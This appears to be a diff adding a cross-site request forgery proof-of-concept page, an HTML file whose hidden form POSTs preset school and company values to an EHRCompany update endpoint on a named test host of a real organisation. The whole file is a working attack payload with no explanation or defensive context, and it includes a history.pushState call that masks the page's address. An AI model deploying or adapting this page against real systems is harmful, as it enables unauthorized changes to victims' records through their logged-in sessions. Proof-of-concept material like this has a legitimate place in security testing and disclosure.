@@ -1,0 +1,14 @@
+<html>
+  <!-- CSRF PoC  -->
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://a2.test.xdf.cn/EHRCompany/UpdateSchoolToEHRCompany" method="POST">
+      <input type="hidden" name="schoolId" value="1" />
+      <input type="hidden" name="schoolName" value="222222" />
+      <input type="hidden" name="companyId" value="106" />
+      <input type="hidden" name="companyName" value=" &#140;&#151; &#172; &#173;&#166; &#160;&#161;" />
+      <input type="hidden" name="companyShortName" value="wewewe" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
